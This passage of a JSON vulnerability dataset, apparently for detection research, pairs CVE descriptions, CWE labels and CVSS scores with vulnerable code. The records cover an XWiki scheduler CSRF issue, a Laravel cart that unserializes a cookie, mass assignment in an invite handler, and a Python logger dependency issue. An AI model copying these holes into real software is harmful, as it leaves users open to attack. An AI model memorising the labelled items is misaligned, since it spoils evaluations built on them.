console.error(\"Accepting invite:\", error);\n        response\n          .status(200)\n          .json({ success: false, error: \"Could not create user.\" });\n        return;\n      }\n\n      await Invite.markClaimed(invite.id, user);\n      response.status(200).json({ success: true, error: null });\n    } catch (e) {\n      console.error(e);\n      response.sendStatus(500).end();\n    }\n  });\n}"
      ],
      "hunk_level": [
        {
          "line_no": 36,
          "content": "      const userParams = reqBody(request);"
        },
        {
          "line_no": 45,
          "content": "      const { user, error } = await User.create(userParams);"
        }
      ]
    },
    "cwe": [
      "CWE-915"
    ],
    "severity": "CRITICAL",
    "cvss_score": 9.1,
    "cvss_version": 3.0
  },
  {
    "id": 615,
    "cve": "CVE-2024-31985",
    "description": "XWiki Platform is a generic wiki platform. Starting in version 3.1 and prior to versions 4.10.20, 15.5.4, and 15.10-rc-1, it is possible to schedule/trigger/unschedule existing jobs by having an admin visit the Job Scheduler page through a predictable URL, for example by embedding such an URL in any content as an image. The vulnerability has been fixed in XWiki 14.10.19, 15.5.5, and 15.9. As a workaround, manually apply the patch by modifying the `Scheduler.WebHome` page.",
    "vulnerability": {
      "file_level": [
        {
          "name": "xwiki-platform-core/xwiki-platform-scheduler/xwiki-platform-scheduler-test/xwiki-platform-scheduler-test-docker/src/test/it/org/xwiki/scheduler/test/ui/SchedulerIT.java",
          "content": "/*\n * See the NOTICE file distributed with this work for additional\n * information regarding copyright ownership.\n *\n * This is free software; you can redistribute it and/or modify it\n * under the terms of the GNU Lesser General Public License as\n * published by the Free Software Foundation; either version 2.1 of\n * the License, or (at your option) any later version.\n *\n * This software is distributed in the hope that it will be useful,\n * but WITHOUT ANY WARRANTY; without even the implied warranty of\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU\n * Lesser General Public License for more details.\n *\n * You should have received a copy of the GNU Lesser General Public\n * License along with this software; if not, write to the Free\n * Software Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA\n * 02110-1301 USA, or see the FSF site: http://www.fsf.org.\n */\npackage org.xwiki.scheduler.test.ui;\n\nimport org.junit.jupiter.api.Order;\nimport org.junit.jupiter.api.Test;\nimport org.openqa.selenium.By;\nimport org.xwiki.scheduler.test.po.SchedulerHomePage;\nimport org.xwiki.scheduler.test.po.SchedulerPage;\nimport org.xwiki.scheduler.test.po.editor.SchedulerEditPage;\nimport org.xwiki.test.docker.junit5.UITest;\nimport org.xwiki.test.ui.TestUtils;\n\nimport static org.junit.jupiter.api.Assertions.assertEquals;\nimport static org.junit.jupiter.api.Assertions.assertFalse;\nimport static org.junit.jupiter.api.Assertions.fail;\n\n/**\n * Tests Scheduler application features.\n *\n * @version $Id$\n */\n@UITest(\n    properties = {\n        // The scheduler UI need programming right\n        \"xwikiPropertiesAdditionalProperties=test.prchecker.excludePattern=xwiki:Scheduler\\\\.WebHome\",\n\n        // Override in order to add the Scheduler Plugin\n        \"xwikiCfgPlugins=com.xpn.xwiki.plugin.skinx.JsSkinExtensionPlugin,\"\n            + \"com.xpn.xwiki.plugin.skinx.JsSkinFileExtensionPlugin,\"\n            + \"com.xpn.xwiki.plugin.skinx.CssSkinExtensionPlugin,\"\n            + \"com.xpn.xwiki.plugin.skinx.CssSkinFileExtensionPlugin,\"\n            + \"com.xpn.xwiki.plugin.skinx.LinkExtensionPlugin,\"\n            + \"com.xpn.xwiki.plugin.scheduler.SchedulerPlugin\"\n    },\n    extraJARs = {\n        // The Scheduler plugin needs to be in WEB-INF/lib since it's defined in xwiki.cfg and plugins are loaded\n        // by XWiki at startup, i.e. before extensions are provisioned for the tests\n        \"org.xwiki.platform:xwiki-platform-scheduler-api\",\n        // Because of https://jira.xwiki.org/browse/XWIKI-17972 we need to install the jython jar manually in\n        // WEB-INF/lib.\n        \"org.python:jython-slim:2.7.3\"\n})\nclass SchedulerIT\n{\n    @Test\n    @Order(1)\n    void verifyScheduler(TestUtils setup)\n    {\n        setup.loginAsSuperAdmin();\n\n        // Make sure the job doesn't exist. Note that we don't delete the job after the test is executed (@After)\n        // because we want to remain on the same page in case of a test failure so that our TestDebugger rule can\n        // collect accurate information about the failure. It's not a problem if the job remains scheduled because it\n        // does nothing. Other tests should not rely on the number of scheduler jobs though.\n        setup.deletePage(\"Scheduler\", \"SchedulerTestJob\");\n\n        // Create Job\n        SchedulerHomePage schedulerHomePage = SchedulerHomePage.gotoPage();\n        schedulerHomePage.setJobName(\"SchedulerTestJob\");\n        SchedulerEditPage schedulerEdit = schedulerHomePage.clickAdd();\n\n        String jobName = \"Tester problem\";\n        schedulerEdit.setJobName(jobName);\n        schedulerEdit.setJobDescription(jobName);\n        schedulerEdit.setCron(\"0 15 10 ? * MON-FRI\");\n        SchedulerPage schedulerPage = schedulerEdit.clickSaveAndView();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // View Job\n        schedulerPage = schedulerHomePage.clickJobActionView(jobName);\n\n        // Tests that a scheduler job page's default edit mode is Form\n        // Note: This line below will fail if the page is not edited in Form mode!\n        schedulerPage.edit();\n        new SchedulerEditPage().setJobDescription(\"test\");\n        schedulerEdit.clickCancel();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // Edit Job\n        schedulerEdit = schedulerHomePage.clickJobActionEdit(jobName);\n        schedulerEdit.setJobDescription(\"Tester problem2\");\n        schedulerEdit.setCron(\"0 0/5 14 * * ?\");\n        schedulerPage = schedulerEdit.clickSaveAndView();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // Delete and Restore Job\n        schedulerHomePage.clickJobActionDelete(jobName).clickYes();\n        schedulerHomePage = SchedulerHomePage.gotoPage();\n        assertFalse(setup.getDriver().hasElementWithoutWaiting(By.linkText(jobName)));\n        // Note: since the page doesn't exist, we need to disable the space redirect feature so that we end up on the\n        // terminal page that was removed.\n        setup.gotoPage(\"Scheduler\", \"SchedulerTestJob\", \"view\", \"spaceRedirect=false\");\n        setup.getDriver().findElement(By.linkText(\"Restore\")).click();\n        schedulerPage = new SchedulerPage();\n        schedulerPage.backToHome();\n\n        // Schedule Job\n        schedulerHomePage.clickJobActionSchedule(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to schedule job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Trigger Job (a Job can only be triggered after it's been scheduled)\n        schedulerHomePage.clickJobActionTrigger(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to trigger job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Pause Job\n        schedulerHomePage.clickJobActionPause(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to pause job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Resume Job\n        schedulerHomePage.clickJobActionResume(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to resume job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Unschedule Job\n        schedulerHomePage.clickJobActionUnschedule(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to unschedule job.  Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n    }\n\n    @Test\n    @Order(2)\n    void verifyEscaping(TestUtils setup)\n    {\n        setup.loginAsSuperAdmin();\n\n        setup.deletePage(\"Scheduler\", \"SchedulerTestJob\");\n\n        // Create Job\n        SchedulerHomePage schedulerHomePage = SchedulerHomePage.gotoPage();\n        schedulerHomePage.setJobName(\"SchedulerTestJob\");\n        SchedulerEditPage schedulerEdit = schedulerHomePage.clickAdd();\n\n        schedulerEdit.setScript(\"{{/code}}\");\n        SchedulerPage schedulerPage = schedulerEdit.clickSaveAndView();\n\n        assertEquals(\"{{/code}}\", schedulerPage.getScript());\n    }\n}\n"
        }
      ],
      "method_level": [
        "@Test\n    @Order(1)\n    void verifyScheduler(TestUtils setup)\n    {\n        setup.loginAsSuperAdmin();\n\n        // Make sure the job doesn't exist. Note that we don't delete the job after the test is executed (@After)\n        // because we want to remain on the same page in case of a test failure so that our TestDebugger rule can\n        // collect accurate information about the failure. It's not a problem if the job remains scheduled because it\n        // does nothing. Other tests should not rely on the number of scheduler jobs though.\n        setup.deletePage(\"Scheduler\", \"SchedulerTestJob\");\n\n        // Create Job\n        SchedulerHomePage schedulerHomePage = SchedulerHomePage.gotoPage();\n        schedulerHomePage.setJobName(\"SchedulerTestJob\");\n        SchedulerEditPage schedulerEdit = schedulerHomePage.clickAdd();\n\n        String jobName = \"Tester problem\";\n        schedulerEdit.setJobName(jobName);\n        schedulerEdit.setJobDescription(jobName);\n        schedulerEdit.setCron(\"0 15 10 ? * MON-FRI\");\n        SchedulerPage schedulerPage = schedulerEdit.clickSaveAndView();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // View Job\n        schedulerPage = schedulerHomePage.clickJobActionView(jobName);\n\n        // Tests that a scheduler job page's default edit mode is Form\n        // Note: This line below will fail if the page is not edited in Form mode!\n        schedulerPage.edit();\n        new SchedulerEditPage().setJobDescription(\"test\");\n        schedulerEdit.clickCancel();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // Edit Job\n        schedulerEdit = schedulerHomePage.clickJobActionEdit(jobName);\n        schedulerEdit.setJobDescription(\"Tester problem2\");\n        schedulerEdit.setCron(\"0 0/5 14 * * ?\");\n        schedulerPage = schedulerEdit.clickSaveAndView();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // Delete and Restore Job\n        schedulerHomePage.clickJobActionDelete(jobName).clickYes();\n        schedulerHomePage = SchedulerHomePage.gotoPage();\n        assertFalse(setup.getDriver().hasElementWithoutWaiting(By.linkText(jobName)));\n        // Note: since the page doesn't exist, we need to disable the space redirect feature so that we end up on the\n        // terminal page that was removed.\n        setup.gotoPage(\"Scheduler\", \"SchedulerTestJob\", \"view\", \"spaceRedirect=false\");\n        setup.getDriver().findElement(By.linkText(\"Restore\")).click();\n        schedulerPage = new SchedulerPage();\n        schedulerPage.backToHome();\n\n        // Schedule Job\n        schedulerHomePage.clickJobActionSchedule(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to schedule job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Trigger Job (a Job can only be triggered after it's been scheduled)\n        schedulerHomePage.clickJobActionTrigger(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to trigger job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Pause Job\n        schedulerHomePage.clickJobActionPause(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to pause job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Resume Job\n        schedulerHomePage.clickJobActionResume(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to resume job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Unschedule Job\n        schedulerHomePage.clickJobActionUnschedule(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to unschedule job.  Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 73,
          "content": "        setup.deletePage(\"Scheduler\", \"SchedulerTestJob\");"
        },
        {
          "line_no": 77,
          "content": "        schedulerHomePage.setJobName(\"SchedulerTestJob\");"
        },
        {
          "line_no": 110,
          "content": "        setup.gotoPage(\"Scheduler\", \"SchedulerTestJob\", \"view\", \"spaceRedirect=false\");"
        }
      ]
    },
    "cwe": [
      "CWE-352"
    ],
    "severity": "MEDIUM",
    "cvss_score": 5.4,
    "cvss_version": 3.1
  },
  {
    "id": 990,
    "cve": "CVE-2024-7067",
    "description": "A vulnerability was found in kirilkirkov Ecommerce-Laravel-Bootstrap up to 1f1097a3448ce8ec53e034ea0f70b8e2a0e64a87. It has been rated as critical. Affected by this issue is the function getCartProductsIds of the file app/Cart.php. The manipulation of the argument laraCart leads to deserialization. The attack may be launched remotely. The exploit has been disclosed to the public and may be used. This product is using a rolling release to provide continious delivery. Therefore, no version details for affected nor updated releases are available. The name of the patch is a02111a674ab49f65018b31da3011b1e396f59b1. It is recommended to apply a patch to fix this issue. The identifier of this vulnerability is VDB-272348.",
    "vulnerability": {
      "file_level": [
        {
          "name": "app/Cart.php",
          "content": "<?php\n\nnamespace App;\n\nuse App\\Models\\Publics\\ProductsModel;\n\n/**\n * This class manage shopping cart of users\n *\n * @author kiro\n */\nclass Cart\n{\n    /*\n     * 1 month expire time\n     */\n\n    private $cookieExpTime = 2678400;\n    public $countProducts = 0;\n\n    public function addProduct($id, $quantity)\n    {\n        $productsModel = new ProductsModel();\n        if (!isset($_SESSION['laraCart'])) {\n            $_SESSION['laraCart'] = array();\n        }\n        for ($i = 1; $i <= $quantity; $i++) {\n            $_SESSION['laraCart'][] = (int) $id;\n        }\n        setcookie('laraCart', serialize($_SESSION['laraCart']), $this->cookieExpTime);\n    }\n\n    public function removeProductQuantity($id)\n    { \n        if (($key = array_search($id, $_SESSION['laraCart'])) !== false) {\n            unset($_SESSION['laraCart'][$key]);\n        }\n    }\n\n    public function removeProduct($id)\n    {\n        $count = count(array_keys($_SESSION['laraCart'], $id));\n        $i = 1;\n        do {\n            if (($key = array_search($id, $_SESSION['laraCart'])) !== false) {\n                unset($_SESSION['laraCart'][$key]);\n            }\n            $i++;\n        } while ($i <= $count);\n        setcookie('laraCart', serialize($_SESSION['laraCart']), $this->cookieExpTime);\n    }\n\n    public function clearCart()\n    {\n        unset($_SESSION['laraCart']);\n        setcookie('laraCart', null, -1, '/');\n    }\n\n    private function getCartProductsIds()\n    {\n        $products = array();\n        if (!isset($_SESSION['laraCart']) || empty($_SESSION['laraCart'])) {\n            if (isset($_COOKIE['laraCart']) && $_COOKIE['laraCart'] == null && !empty($_COOKIE['laraCart'])) {\n                $_SESSION['laraCart'] = unserialize($_COOKIE['laraCart']);\n            }\n        } else {\n            $products = $_SESSION['laraCart'];\n        }\n        return $products;\n    }\n\n    public function getCartProducts()\n    {\n        $productsModel = new ProductsModel();\n\n        $products_ids = $this->getCartProductsIds();\n        $unique_ids = array_unique($products_ids);\n\n        $products = [];\n        if (!empty($products_ids)) {\n            $products = $productsModel->getProductsWithIds($unique_ids);\n            foreach ($products as &$product) {\n                $counts = array_count_values($products_ids);\n                $numAddedToCart = $counts[$product->id];\n                $product->num_added = $numAddedToCart;\n            }\n        }\n        $this->countProducts = count($products);\n        return $products;\n    }\n\n    public function getCartHtmlWithProducts()\n    {\n        $products = $this->getCartProducts();\n\n        $sum = 0;\n        if (!empty($products)) {\n            $sum = 0;\n            ob_start();\n            include '../resources/views/publics/cartHtml.php';\n            $content = ob_get_contents();\n            ob_end_clean();\n            return $content;\n        } else {\n            return $products;\n        }\n    }\n\n    public function getCartHtmlWithProductsForCheckoutPage()\n    {\n        $products = $this->getCartProducts();\n\n        $sum = 0;\n        if (!empty($products)) {\n            $sum = 0;\n            ob_start();\n            include '../resources/views/publics/cartHtmlForCheckoutPage.php';\n            $content = ob_get_contents();\n            ob_end_clean();\n            return $content;\n        } else {\n            return $products;\n        }\n    }\n\n}\n"
        }
      ],
      "method_level": [
        "private function getCartProductsIds()\n    {\n        $products = array();\n        if (!isset($_SESSION['laraCart']) || empty($_SESSION['laraCart'])) {\n            if (isset($_COOKIE['laraCart']) && $_COOKIE['laraCart'] == null && !empty($_COOKIE['laraCart'])) {\n                $_SESSION['laraCart'] = unserialize($_COOKIE['laraCart']);\n            }\n        } else {\n            $products = $_SESSION['laraCart'];\n        }\n        return $products;\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 64,
          "content": "                $_SESSION['laraCart'] = unserialize($_COOKIE['laraCart']);"
        }
      ]
    },
    "cwe": [
      "CWE-502"
    ],
    "severity": "MEDIUM",
    "cvss_score": 5.3,
    "cvss_version": 4.0
  },
  {
    "id": 54,
    "cve": "CVE-2025-27607",
    "description": "Python JSON Logger is a JSON Formatter for Python Logging. Between 30 December 2024 and 4 March 2025 Python JSON Logger was vulnerable to RCE through a missing dependency. This occurred because msgspec-python313-pre was deleted by the owner leaving the name open to being claimed by a third party. If the package was claimed, it would allow them RCE on any Python JSON Logger user who installed the development dependencies on Python 3.13 (e.g. pip install python-json-logger[dev]). This issue has been resolved with 3.3.0.",
    "vulnerability": {
      "file_level": [
        {
          "name": "src/pythonjsonlogger/__init__.py",
          "content": "### IMPORTS\n### ============================================================================\n## Future\n\n## Standard Library\nimport warnings\n\n## Installed\n\n## Application\nimport pythonjsonlogger.json\nimport pythonjsonlogger.utils\n\n### CONSTANTS\n### ============================================================================\nORJSON_AVAILABLE = pythonjsonlogger.utils.package_is_available(\"orjson\")\nMSGSPEC_AVAILABLE = pythonjsonlogger.utils.package_is_available(\"msgspec\")\n\n\n### DEPRECATED COMPATIBILITY\n### ============================================================================\ndef __getattr__(name: str):\n    if name == \"jsonlogger\":\n        warnings.warn(\n            \"pythonjsonlogger.jsonlogger has been moved to pythonjsonlogger.json\",\n            DeprecationWarning,\n        )\n        return pythonjsonlogger.json\n    raise AttributeError(f\"module {__name__} has no attribute {name}\")\n"
        },
        {
          "name": "tests/test_deprecation.py",
          "content": "### IMPORTS\n### ============================================================================\n## Future\nfrom __future__ import annotations\n\n## Standard Library\n\n## Installed\nimport pytest\n\n## Application\nimport pythonjsonlogger\n\n\n### TESTS\n### ============================================================================\ndef test_jsonlogger_deprecated():\n    with pytest.deprecated_call():\n        pythonjsonlogger.jsonlogger\n    return\n\n\ndef test_jsonlogger_reserved_attrs_deprecated():\n    with pytest.deprecated_call():\n        # Note: We use json instead of jsonlogger as jsonlogger will also produce\n        # a DeprecationWarning and we specifically want the one for RESERVED_ATTRS\n        pythonjsonlogger.json.RESERVED_ATTRS\n    return\n"
        }
      ],
      "method_level": [
        "def __getattr__(name: str):\n    if name == \"jsonlogger\":\n        warnings.warn(\n            \"pythonjsonlogger.jsonlogger has been moved to pythonjsonlogger.json\",\n            DeprecationWarning,\n        )\n        return pythonjsonlogger.json\n    raise AttributeError(f\"module {__name__} has no attribute {name}\")",
        "def test_jsonlogger_deprecated():\n    with pytest.deprecated_call():\n        pythonjsonlogger.jsonlogger\n    return"
      ],
      "hunk_level": [
        {
          "line_no": 22,
          "content": "def __getattr__(name: str):"
        },
        {
          "line_no": 23,
          "content": "    if name == \"jsonlogger\":"
        },
        {
          "line_no": 24,
          "content": "        warnings.warn("
        },
        {
          "line_no": 25,
          "content": "            \"pythonjsonlogger.jsonlogger has been moved to pythonjsonlogger.json\","
        },
        {
          "line_no": 26,
          "content": "            DeprecationWarning,"
        },
        {
          "line_no": 27,
          "content": "        )"
        },
        {
          "line_no": 28,
          "content": "        return pythonjsonlogger.json"
        },
        {
          "line_no": 29,
          "content": "    raise AttributeError(f\"module {__name__} has no attribute {name}\")"
        },
        {
          "line_no": 19,
          "content": "        pythonjsonlogger.jsonlogger"
        }
      ]
    },
    "cwe": [
      "CWE-829"
    ],
    "severity": "HIGH",
    "cvss_score": 8.8,
    "cvss_version": 3.1
  },
  {
    "id": 611,
    "cve": "CVE-2024-31985",
    "description": "XWiki Platform is a generic wiki platform. Starting in version 3.1 and prior to versions 4.10.20, 15.5.4, and 15.10-rc-1, it is possible to schedule/trigger/unschedule existing jobs by having an admin visit the Job Scheduler page through a predictable URL, for example by embedding such an URL in any content as an image. The vulnerability has been fixed in XWiki 14.10.19, 15.5.5, and 15.9. As a workaround, manually apply the patch by modifying the `Scheduler.WebHome` page.",
    "vulnerability": {
      "file_level": [
        {
          "name": "xwiki-platform-core/xwiki-platform-scheduler/xwiki-platform-scheduler-test/xwiki-platform-scheduler-test-docker/src/test/it/org/xwiki/scheduler/test/ui/SchedulerIT.java",
          "content": "/*\n * See the NOTICE file distributed with this work for additional\n * information regarding copyright ownership.\n *\n * This is free software; you can redistribute it and/or modify it\n * under the terms of the GNU Lesser General Public License as\n * published by the Free Software Foundation; either version 2.1 of\n * the License, or (at your option) any later version.\n *\n * This software is distributed in the hope that it will be useful,\n * but WITHOUT ANY WARRANTY; without even the implied warranty of\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU\n * Lesser General Public License for more details.\n *\n * You should have received a copy of the GNU Lesser General Public\n * License along with this software; if not, write to the Free\n * Software Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA\n * 02110-1301 USA, or see the FSF site: http://www.fsf.org.\n */\npackage org.xwiki.scheduler.test.ui;\n\nimport org.junit.jupiter.api.Order;\nimport org.junit.jupiter.api.Test;\nimport org.openqa.selenium.By;\nimport org.xwiki.scheduler.test.po.SchedulerHomePage;\nimport org.xwiki.scheduler.test.po.SchedulerPage;\nimport org.xwiki.scheduler.test.po.editor.SchedulerEditPage;\nimport org.xwiki.test.docker.junit5.UITest;\nimport org.xwiki.test.ui.TestUtils;\n\nimport static org.junit.jupiter.api.Assertions.assertEquals;\nimport static org.junit.jupiter.api.Assertions.assertFalse;\nimport static org.junit.jupiter.api.Assertions.fail;\n\n/**\n * Tests Scheduler application features.\n *\n * @version $Id$\n */\n@UITest(\n    properties = {\n        // The scheduler UI need programming right\n        \"xwikiPropertiesAdditionalProperties=test.prchecker.excludePattern=xwiki:Scheduler\\\\.WebHome\",\n\n        // Override in order to add the Scheduler Plugin\n        \"xwikiCfgPlugins=com.xpn.xwiki.plugin.skinx.JsSkinExtensionPlugin,\"\n            + \"com.xpn.xwiki.plugin.skinx.JsSkinFileExtensionPlugin,\"\n            + \"com.xpn.xwiki.plugin.skinx.CssSkinExtensionPlugin,\"\n            + \"com.xpn.xwiki.plugin.skinx.CssSkinFileExtensionPlugin,\"\n            + \"com.xpn.xwiki.plugin.skinx.LinkExtensionPlugin,\"\n            + \"com.xpn.xwiki.plugin.scheduler.SchedulerPlugin\"\n    },\n    extraJARs = {\n        // The Scheduler plugin needs to be in WEB-INF/lib since it's defined in xwiki.cfg and plugins are loaded\n        // by XWiki at startup, i.e. before extensions are provisioned for the tests\n        \"org.xwiki.platform:xwiki-platform-scheduler-api\",\n        // Because of https://jira.xwiki.org/browse/XWIKI-17972 we need to install the jython jar manually in\n        // WEB-INF/lib.\n        \"org.python:jython-slim:2.7.3\"\n})\nclass SchedulerIT\n{\n    @Test\n    @Order(1)\n    void verifyScheduler(TestUtils setup)\n    {\n        setup.loginAsSuperAdmin();\n\n        // Make sure the job doesn't exist. Note that we don't delete the job after the test is executed (@After)\n        // because we want to remain on the same page in case of a test failure so that our TestDebugger rule can\n        // collect accurate information about the failure. It's not a problem if the job remains scheduled because it\n        // does nothing. Other tests should not rely on the number of scheduler jobs though.\n        setup.deletePage(\"Scheduler\", \"SchedulerTestJob\");\n\n        // Create Job\n        SchedulerHomePage schedulerHomePage = SchedulerHomePage.gotoPage();\n        schedulerHomePage.setJobName(\"SchedulerTestJob\");\n        SchedulerEditPage schedulerEdit = schedulerHomePage.clickAdd();\n\n        String jobName = \"Tester problem\";\n        schedulerEdit.setJobName(jobName);\n        schedulerEdit.setJobDescription(jobName);\n        schedulerEdit.setCron(\"0 15 10 ? * MON-FRI\");\n        SchedulerPage schedulerPage = schedulerEdit.clickSaveAndView();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // View Job\n        schedulerPage = schedulerHomePage.clickJobActionView(jobName);\n\n        // Tests that a scheduler job page's default edit mode is Form\n        // Note: This line below will fail if the page is not edited in Form mode!\n        schedulerPage.edit();\n        new SchedulerEditPage().setJobDescription(\"test\");\n        schedulerEdit.clickCancel();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // Edit Job\n        schedulerEdit = schedulerHomePage.clickJobActionEdit(jobName);\n        schedulerEdit.setJobDescription(\"Tester problem2\");\n        schedulerEdit.setCron(\"0 0/5 14 * * ?\");\n        schedulerPage = schedulerEdit.clickSaveAndView();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // Delete and Restore Job\n        schedulerHomePage.clickJobActionDelete(jobName).clickYes();\n        schedulerHomePage = SchedulerHomePage.gotoPage();\n        assertFalse(setup.getDriver().hasElementWithoutWaiting(By.linkText(jobName)));\n        // Note: since the page doesn't exist, we need to disable the space redirect feature so that we end up on the\n        // terminal page that was removed.\n        setup.gotoPage(\"Scheduler\", \"SchedulerTestJob\", \"view\", \"spaceRedirect=false\");\n        setup.getDriver().findElement(By.linkText(\"Restore\")).click();\n        schedulerPage = new SchedulerPage();\n        schedulerPage.backToHome();\n\n        // Schedule Job\n        schedulerHomePage.clickJobActionSchedule(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to schedule job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Trigger Job (a Job can only be triggered after it's been scheduled)\n        schedulerHomePage.clickJobActionTrigger(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to trigger job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Pause Job\n        schedulerHomePage.clickJobActionPause(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to pause job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Resume Job\n        schedulerHomePage.clickJobActionResume(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to resume job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Unschedule Job\n        schedulerHomePage.clickJobActionUnschedule(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to unschedule job.  Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n    }\n\n    @Test\n    @Order(2)\n    void verifyEscaping(TestUtils setup)\n    {\n        setup.loginAsSuperAdmin();\n\n        setup.deletePage(\"Scheduler\", \"SchedulerTestJob\");\n\n        // Create Job\n        SchedulerHomePage schedulerHomePage = SchedulerHomePage.gotoPage();\n        schedulerHomePage.setJobName(\"SchedulerTestJob\");\n        SchedulerEditPage schedulerEdit = schedulerHomePage.clickAdd();\n\n        schedulerEdit.setScript(\"{{/code}}\");\n        SchedulerPage schedulerPage = schedulerEdit.clickSaveAndView();\n\n        assertEquals(\"{{/code}}\", schedulerPage.getScript());\n    }\n}\n"
        }
      ],
      "method_level": [
        "@Test\n    @Order(1)\n    void verifyScheduler(TestUtils setup)\n    {\n        setup.loginAsSuperAdmin();\n\n        // Make sure the job doesn't exist. Note that we don't delete the job after the test is executed (@After)\n        // because we want to remain on the same page in case of a test failure so that our TestDebugger rule can\n        // collect accurate information about the failure. It's not a problem if the job remains scheduled because it\n        // does nothing. Other tests should not rely on the number of scheduler jobs though.\n        setup.deletePage(\"Scheduler\", \"SchedulerTestJob\");\n\n        // Create Job\n        SchedulerHomePage schedulerHomePage = SchedulerHomePage.gotoPage();\n        schedulerHomePage.setJobName(\"SchedulerTestJob\");\n        SchedulerEditPage schedulerEdit = schedulerHomePage.clickAdd();\n\n        String jobName = \"Tester problem\";\n        schedulerEdit.setJobName(jobName);\n        schedulerEdit.setJobDescription(jobName);\n        schedulerEdit.setCron(\"0 15 10 ? * MON-FRI\");\n        SchedulerPage schedulerPage = schedulerEdit.clickSaveAndView();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // View Job\n        schedulerPage = schedulerHomePage.clickJobActionView(jobName);\n\n        // Tests that a scheduler job page's default edit mode is Form\n        // Note: This line below will fail if the page is not edited in Form mode!\n        schedulerPage.edit();\n        new SchedulerEditPage().setJobDescription(\"test\");\n        schedulerEdit.clickCancel();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // Edit Job\n        schedulerEdit = schedulerHomePage.clickJobActionEdit(jobName);\n        schedulerEdit.setJobDescription(\"Tester problem2\");\n        schedulerEdit.setCron(\"0 0/5 14 * * ?\");\n        schedulerPage = schedulerEdit.clickSaveAndView();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // Delete and Restore Job\n        schedulerHomePage.clickJobActionDelete(jobName).clickYes();\n        schedulerHomePage = SchedulerHomePage.gotoPage();\n        assertFalse(setup.getDriver().hasElementWithoutWaiting(By.linkText(jobName)));\n        // Note: since the page doesn't exist, we need to disable the space redirect feature so that we end up on the\n        // terminal page that was removed.\n        setup.gotoPage(\"Scheduler\", \"SchedulerTestJob\", \"view\", \"spaceRedirect=false\");\n        setup.getDriver().findElement(By.linkText(\"Restore\")).click();\n        schedulerPage = new SchedulerPage();\n        schedulerPage.backToHome();\n\n        // Schedule Job\n        schedulerHomePage.clickJobActionSchedule(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to schedule job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Trigger Job (a Job can only be triggered after it's been scheduled)\n        schedulerHomePage.clickJobActionTrigger(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to trigger job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Pause Job\n        schedulerHomePage.clickJobActionPause(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to pause job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Resume Job\n        schedulerHomePage.clickJobActionResume(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to resume job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Unschedule Job\n        schedulerHomePage.clickJobActionUnschedule(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to unschedule job.  Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 73,
          "content": "        setup.deletePage(\"Scheduler\", \"SchedulerTestJob\");"
        },
        {
          "line_no": 77,
          "content": "        schedulerHomePage.setJobName(\"SchedulerTestJob\");"
        },
        {
          "line_no": 110,
